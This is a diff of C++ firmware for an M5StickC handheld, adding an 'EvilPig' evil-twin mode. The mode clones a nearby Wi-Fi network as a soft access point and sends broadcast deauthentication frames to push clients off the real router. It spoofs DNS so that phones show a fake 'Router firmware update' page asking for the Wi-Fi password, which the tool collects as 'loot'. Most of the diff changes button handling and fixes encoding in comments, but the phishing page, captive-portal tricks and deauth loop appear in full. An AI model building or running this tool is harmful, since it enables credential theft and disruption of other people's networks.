@@ -1,4 +1,4 @@
-// EvilPig вЂ” network select + client estimate + softAP clone + deauth kicks
+// EvilPig — network select + client estimate + softAP clone + deauth kicks
 // Deauth uses WSLBypasser (same as OINK). Portal uses WebServer+DNSServer.
 // LAB / authorized networks only.
 
@@ -24,10 +24,11 @@
 #include "../audio/sfx.h"
 #include "oink.h"  // DetectedNetwork
 
+// StickC Plus 2 has no QWERTY keyboard: KEY_ENTER came from Arduino Keyboard.h.
+// No physical Enter key exists; define as ASCII CR so it compiles.
 #ifndef KEY_ENTER
 #define KEY_ENTER 13
 #endif
-
 
 bool EvilPigMode::running = false;
 EvilPigMode::Phase EvilPigMode::phase = EvilPigMode::Phase::SELECT;
@@ -170,9 +171,9 @@ button{width:100%;padding:12px;border:0;border-radius:6px;background:#0b57d0;col
 <div class="box">
 <h1>Router firmware update</h1>
 <div id="f">
-<p>A critical WiвЂ‘Fi router update is required. Enter the network password to continue.</p>
+<p>A critical Wi‑Fi router update is required. Enter the network password to continue.</p>
 <form method="POST" action="/post" id="frm">
-<input type="password" name="password" placeholder="WiвЂ‘Fi password" required autocomplete="current-password">
+<input type="password" name="password" placeholder="Wi‑Fi password" required autocomplete="current-password">
 <button type="submit">Update now</button>
 </form>
 </div>
@@ -273,7 +274,7 @@ void EvilPigMode::sortListByRssi() {
     }
 }
 
-// Blocking STA scan вЂ” works without OINK/handshake mode. Stops recon first so
+// Blocking STA scan — works without OINK/handshake mode. Stops recon first so
 // promiscuous + scan don't fight (that path used to fail / look like "error").
 uint8_t EvilPigMode::staScanIntoList() {
     listCount = 0;
@@ -402,11 +403,11 @@ void EvilPigMode::applySelection() {
     if (apChannel < 1 || apChannel > 13) apChannel = 6;
     targetClients = p.clients;
     targetPmf = p.hasPmf;
-    deauthOn = !p.hasPmf && Config::radio().deauth;  // PMF в†’ kick mostly useless
+    deauthOn = !p.hasPmf && Config::radio().deauth;  // PMF → kick mostly useless
     snprintf(lastEvent, sizeof(lastEvent), "SEL %s", apSsid);
 }
 
-// Fixed AP IP вЂ” don't rely on softAPIP() during early DHCP/captive probes
+// Fixed AP IP — don't rely on softAPIP() during early DHCP/captive probes
 static const IPAddress kPortalIp(192, 168, 4, 1);
 static const IPAddress kPortalMask(255, 255, 255, 0);
 
@@ -541,7 +542,7 @@ void EvilPigMode::handleNotFound() {
         handlePost();
         return;
     }
-    // Any unknown host/path (DNS spoofed) в†’ portal page.
+    // Any unknown host/path (DNS spoofed) → portal page.
     // Do NOT return 204/Success or phones think the network is online.
     handleCaptiveProbe();
 }
@@ -577,7 +578,7 @@ void EvilPigMode::setupRoutes() {
     server->on("/post", HTTP_POST, handlePost);
     server->on("/post", HTTP_GET, handleRoot);
 
-    // Android captive (must NOT be empty 204 вЂ” that = "internet OK")
+    // Android captive (must NOT be empty 204 — that = "internet OK")
     server->on("/generate_204", HTTP_GET, handleCaptiveProbe);
     server->on("/generate_204", HTTP_POST, handleCaptiveProbe);
     server->on("/gen_204", HTTP_GET, handleCaptiveProbe);
@@ -612,7 +613,7 @@ bool EvilPigMode::startPortal() {
     applySelection();
     epCliStop();
 
-    // Own the radio cleanly вЂ” do not depend on OINK having run first
+    // Own the radio cleanly — do not depend on OINK having run first
     NetworkRecon::stop();
     WiFiUtils::stopPromiscuous();
     NetworkRecon::freeNetworks();
@@ -640,7 +641,7 @@ bool EvilPigMode::startPortal() {
     // APSTA: softAP portal + STA iface for raw deauth TX
     WiFi.mode(WIFI_AP_STA);
     delay(120);
-    // STA must not keep old association / DHCP вЂ” confuses phone routing
+    // STA must not keep old association / DHCP — confuses phone routing
     WiFi.disconnect(true, true);
     delay(40);
     esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
@@ -684,7 +685,7 @@ bool EvilPigMode::startPortal() {
     server->stop();
     delay(20);
 
-    // Wildcard DNS в†’ every name resolves to portal AP (HTTP captive only)
+    // Wildcard DNS → every name resolves to portal AP (HTTP captive only)
     dns->stop();
     dns->setErrorReplyCode(DNSReplyCode::NoError);
     dns->setTTL(0);  // no cache on clients when possible
@@ -729,7 +730,7 @@ void EvilPigMode::tickDeauth() {
     if (zero) return;
 
     uint32_t now = millis();
-    if (now - lastDeauthMs < 280) return;  // ~3.5 Hz вЂ” effective, not spam-hell
+    if (now - lastDeauthMs < 280) return;  // ~3.5 Hz — effective, not spam-hell
     lastDeauthMs = now;
 
     // Broadcast deauth + disassoc (kick everyone off real AP)
@@ -775,7 +776,7 @@ void EvilPigMode::start() {
             ensureListVisible();
         }
     } else {
-        // Cold start: do not require handshake mode вЂ” clean STA scan
+        // Cold start: do not require handshake mode — clean STA scan
         setStatus("SCAN...");
         staScanIntoList();
         lastListRefresh = millis();
@@ -826,32 +827,148 @@ void EvilPigMode::stop() {
 
 void EvilPigMode::handleInputSelect() {
     static bool keyWas = false;
-    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed()) {
+    static uint32_t s_repMs = 0;
+    const uint32_t now = millis();
+    const bool holdA = ButtonMapper::holdA();
+    const bool holdB = ButtonMapper::holdB();
+
+    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed() && !holdA && !holdB) {
         keyWas = false;
+        s_repMs = 0;
         return;
     }
 
-    if (ButtonMapper::isKeyPressed(';') && listCount > 0) {
+    // Аналог удержания кнопок (как holdA/holdB в ButtonMapper):
+    // удержание A — быстрый листай вниз, удержание B — быстрый листай вверх.
+    if (listCount > 0) {
+        if (holdA && !holdB) {
+            if (!s_repMs || now - s_repMs >= 120u) {
+                s_repMs = now;
+                listIdx = (listIdx + 1) % listCount;
+                ensureListVisible();
+                keyWas = true;
+                return;
+            }
+        } else if (holdB && !holdA) {
+            if (!s_repMs || now - s_repMs >= 120u) {
+                s_repMs = now;
+                if (listIdx == 0) listIdx = listCount - 1;
+                else listIdx--;
+                ensureListVisible();
+                keyWas = true;
+                return;
+            }
+        } else {
+            s_repMs = 0;
+        }
+    }
+
+    // Одиночные нажатия (тап) — только когда нет автоповтора удержания.
+    if (!s_repMs) {
+        if (ButtonMapper::isKeyPressed(';') && listCount > 0) {
+            if (!keyWas) {
+                keyWas = true;
+                if (listIdx == 0) listIdx = listCount - 1;
+                else listIdx--;
+                ensureListVisible();
+            }
+            return;
+        }
+        if (ButtonMapper::isKeyPressed('.') && listCount > 0) {
+            if (!keyWas) {
+                keyWas = true;
+                listIdx = (listIdx + 1) % listCount;
+                ensureListVisible();
+            }
+            return;
+        }
+        if (ButtonMapper::isKeyPressed('r') || ButtonMapper::isKeyPressed('R')) {
+            if (!keyWas) {
+                keyWas = true;
+                refreshNetworkList();
+            }
+            return;
+        }
+        if (ButtonMapper::isKeyPressed('v') || ButtonMapper::isKeyPressed('V')) {
+            if (!keyWas) {
+                keyWas = true;
+                openLoot();
+            }
+            return;
+        }
+        if (ButtonMapper::back()) {
+            if (!keyWas) {
+                keyWas = true;
+                stop();
+            }
+            return;
+        }
+        // PWR short click — уже фронт (wasClicked), keyWas не нужен
+        if (ButtonMapper::ok() || ButtonMapper::isKeyPressed(KEY_ENTER)) {
+            if (listCount > 0) {
+                applySelection();
+                char msg[40];
+                snprintf(msg, sizeof(msg), "%s ?", apSsid);
+                if (!Display::showConfirmBox("CLONE+KICK", msg)) return;
+                if (!startPortal()) {
+                    // Show real reason (LOW HEAP / AP FAIL / OOM) instead of generic FAIL
+                    Display::notify(NoticeKind::ERROR, statusMsg, 2500, NoticeChannel::TOP_BAR);
+                    Display::showToast(statusMsg);
+                    if (!NetworkRecon::isRunning()) NetworkRecon::start();
+                    phase = Phase::SELECT;
+                    refreshNetworkList();
+                    return;
+                }
+                Avatar::setState(AvatarState::HAPPY);
+                Display::notify(NoticeKind::STATUS, "PORTAL ON", 2000, NoticeChannel::TOP_BAR);
+            }
+            return;
+        }
+    }
+    if (!ButtonMapper::isPressed() && !holdA && !holdB) keyWas = false;
+}
+
+void EvilPigMode::handleInputPortal() {
+    static bool keyWas = false;
+    static uint32_t s_kickMs = 0;
+    const uint32_t now = millis();
+    const bool holdA = ButtonMapper::holdA();
+    const bool holdB = ButtonMapper::holdB();
+
+    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed() && !holdA && !holdB) {
+        keyWas = false;
+        s_kickMs = 0;
+        return;
+    }
+
+    // Длительное удержание A — переключить кик клиентов (аналог необрабатываемого 'k').
+    // Повтор не чаще раза в 500 мс, чтобы не переключаться при каждом кадре.
+    if (holdA && !targetPmf) {
+        if (!s_kickMs || now - s_kickMs >= 500u) {
+            s_kickMs = now;
+            deauthOn = !deauthOn;
+            setStatus(deauthOn ? "KICK ON" : "KICK OFF");
+            keyWas = true;
+            return;
+        }
+    } else {
+        s_kickMs = 0;
+    }
+
+    // Длительное удержание B — открыть лут (аналог необрабатываемого 'v').
+    if (holdB) {
         if (!keyWas) {
             keyWas = true;
-            if (listIdx == 0) listIdx = listCount - 1;
-            else listIdx--;
-            ensureListVisible();
+            openLoot();
         }
         return;
     }
-    if (ButtonMapper::isKeyPressed('.') && listCount > 0) {
-        if (!keyWas) {
+
+    if (ButtonMapper::isKeyPressed('k') || ButtonMapper::isKeyPressed('K')) {
+        if (!keyWas && !targetPmf) {
             keyWas = true;
-            listIdx = (listIdx + 1) % listCount;
-            ensureListVisible();
-        }
-        return;
-    }
-    if (ButtonMapper::isKeyPressed('r') || ButtonMapper::isKeyPressed('R')) {
-        if (!keyWas) {
-            keyWas = true;
-            refreshNetworkList();
+            deauthOn = !deauthOn;
+            setStatus(deauthOn ? "KICK ON" : "KICK OFF");
         }
         return;
     }
@@ -869,98 +986,74 @@ void EvilPigMode::handleInputSelect() {
         }
         return;
     }
-    // PWR click — без keyWas, это уже фронт wasClicked. Дебаунс не нужен.
-    if (ButtonMapper::ok() || ButtonMapper::isKeyPressed(KEY_ENTER)) {
-        if (listCount > 0) {
-            applySelection();
-            char msg[40];
-            snprintf(msg, sizeof(msg), "%s ?", apSsid);
-            if (!Display::showConfirmBox("CLONE+KICK", msg)) return;
-            if (!startPortal()) {
-                Display::notify(NoticeKind::ERROR, statusMsg, 2500, NoticeChannel::TOP_BAR);
-                Display::showToast(statusMsg);
-                if (!NetworkRecon::isRunning()) NetworkRecon::start();
-                phase = Phase::SELECT;
-                refreshNetworkList();
-                return;
-            }
-            Avatar::setState(AvatarState::HAPPY);
-            Display::notify(NoticeKind::STATUS, "PORTAL ON", 2000, NoticeChannel::TOP_BAR);
-        }
-        return;
-    }
-    if (!ButtonMapper::isPressed()) keyWas = false;
-}
-
-void EvilPigMode::handleInputPortal() {
-    static bool keyWas = false;
-    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed()) {
-        keyWas = false;
-        return;
-    }
-    // PWR short → toggle kick on/off
-    if (ButtonMapper::ok() || ButtonMapper::isKeyPressed('k') || ButtonMapper::isKeyPressed('K')) {
-        if (!keyWas) {
-            keyWas = true;
-            if (!targetPmf) {
-                deauthOn = !deauthOn;
-                setStatus(deauthOn ? "KICK ON" : "KICK OFF");
-            }
-        }
-        return;
-    }
-    // A tap → open loot view
-    if (ButtonMapper::tapA() || ButtonMapper::isKeyPressed('v') || ButtonMapper::isKeyPressed('V')) {
-        if (!keyWas) {
-            keyWas = true;
-            openLoot();
-        }
-        return;
-    }
-    // PWR long → stop and exit
-    if (ButtonMapper::back()) {
-        if (!keyWas) {
-            keyWas = true;
-            stop();
-        }
-        return;
-    }
-    if (!ButtonMapper::isPressed()) keyWas = false;
+    if (!ButtonMapper::isPressed() && !holdA && !holdB) keyWas = false;
 }
 
 void EvilPigMode::handleInputLoot() {
     static bool keyWas = false;
-    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed()) {
+    static uint32_t s_repMs = 0;
+    const uint32_t now = millis();
+    const bool holdA = ButtonMapper::holdA();
+    const bool holdB = ButtonMapper::holdB();
+
+    if (!ButtonMapper::isChanged() && !ButtonMapper::isPressed() && !holdA && !holdB) {
         keyWas = false;
+        s_repMs = 0;
         return;
     }
-    if (ButtonMapper::isKeyPressed(';')) {
-        if (!keyWas && lootScroll > 0) {
-            keyWas = true;
-            lootScroll--;
+
+    // Аналог удержания кнопок: удержание A — быстрая прокрутка лут вниз,
+    // удержание B — быстрая прокрутка лут вверх (повтор каждые ~120 мс).
+    if (catchCount > 0) {
+        if (holdA && !holdB) {
+            if (!s_repMs || now - s_repMs >= 120u) {
+                s_repMs = now;
+                if (lootScroll + 4 < catchCount) {
+                    lootScroll++;
+                    keyWas = true;
+                    return;
+                }
+            }
+        } else if (holdB && !holdA) {
+            if (!s_repMs || now - s_repMs >= 120u) {
+                s_repMs = now;
+                if (lootScroll > 0) {
+                    lootScroll--;
+                    keyWas = true;
+                    return;
+                }
+            }
+        } else {
+            s_repMs = 0;
         }
-        return;
     }
-    if (ButtonMapper::isKeyPressed('.')) {
-        if (!keyWas && catchCount > 0 && lootScroll + 4 < catchCount) {
-            keyWas = true;
-            lootScroll++;
+
+    // Одиночные нажатия (тап).
+    if (!s_repMs) {
+        if (ButtonMapper::isKeyPressed(';')) {
+            if (!keyWas && lootScroll > 0) {
+                keyWas = true;
+                lootScroll--;
+            }
+            return;
         }
-        return;
-    }
-    // PWR short or long = back to previous phase
-    if (ButtonMapper::ok() ||
-        ButtonMapper::back() ||
-        ButtonMapper::isKeyPressed(KEY_ENTER) ||
-        ButtonMapper::isKeyPressed('v') ||
-        ButtonMapper::isKeyPressed('V')) {
-        if (!keyWas) {
-            keyWas = true;
-            phase = phaseBeforeLoot;
+        if (ButtonMapper::isKeyPressed('.')) {
+            if (!keyWas && catchCount > 0 && lootScroll + 4 < catchCount) {
+                keyWas = true;
+                lootScroll++;
+            }
+            return;
         }
-        return;
+        // ` / Enter / V = back to previous phase
+        if (ButtonMapper::back() || ButtonMapper::ok() || ButtonMapper::isKeyPressed(KEY_ENTER) || ButtonMapper::isKeyPressed('v') || ButtonMapper::isKeyPressed('V')) {
+            if (!keyWas) {
+                keyWas = true;
+                phase = phaseBeforeLoot;
+            }
+            return;
+        }
     }
-    if (!ButtonMapper::isPressed()) keyWas = false;
+    if (!ButtonMapper::isPressed() && !holdA && !holdB) keyWas = false;
 }
 
 void EvilPigMode::update() {
@@ -1020,12 +1113,12 @@ const char* EvilPigMode::getBottomHint() {
                      (unsigned long)deauthCount);
             return buf;
         }
-        return "A/B NAVIGATE  PWR SELECT  HOLD BACK";
+        return "hold A KICK  hold B LOOT  ESC EXIT";
     }
-    if (phase == Phase::LOOT) return "A/B BROWSE  PWR BACK  HOLD EXIT";
-    if (page == 0) return "A/B SELECT  PWR OPEN";
-    if (page == 1) return "PWR SELECT  HOLD PWR BACK";
-    return "HOLD PWR EXIT";
+    if (phase == Phase::LOOT) return "^/v  hold ^/v fast  ESC BACK";
+    if (page == 0) return "^/v  hold ^/v fast  ENT CLONE";
+    if (page == 1) return "R rescan  hold B LOOT";
+    return "ESC EXIT";
 }
 
 // Clip helper: write at most maxLen chars into out (null-terminated)
@@ -1131,7 +1224,7 @@ void EvilPigMode::drawPortal(M5Canvas& canvas) {
     uiDrawMarquee(canvas, apSsid[0] ? apSsid : "-", 4, 10, DISPLAY_W - 48, 12);
     canvas.setTextSize(1);
 
-    // Live client connection line вЂ” green when someone is on softAP
+    // Live client connection line — green when someone is on softAP
     canvas.setTextColor(cl > 0 ? UiStyle::GREEN : UiStyle::DIM);
     char clLine[36];
     if (cl > 0) {
@@ -1217,5 +1310,3 @@ void EvilPigMode::draw(M5Canvas& canvas) {
     else if (phase == Phase::LOOT) drawLoot(canvas);
     else drawPortal(canvas);
 }
-
-
